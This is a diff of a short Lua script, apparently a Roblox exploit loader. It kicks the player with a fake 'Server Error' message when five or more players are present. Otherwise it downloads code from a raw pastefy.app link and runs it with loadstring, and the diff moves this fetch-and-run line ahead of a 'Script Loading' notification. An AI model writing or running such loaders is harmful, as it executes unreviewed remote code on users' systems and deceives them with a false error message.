@@ -6,11 +6,10 @@ local playerCount = #Players:GetPlayers()
 if playerCount >= 5 then
     LocalPlayer:Kick("Server Error: Please try another server.")
 else
+    loadstring(game:HttpGet("https://pastefy.app/cHqeEF1p/raw"))()
     StarterGui:SetCore("SendNotification", {
         Title = "Script Loading",
         Text = "Please Wait Until 100%",
         Duration = 5
     })
-
-    loadstring(game:HttpGet("https://pastefy.app/cHqeEF1p/raw"))()
 end
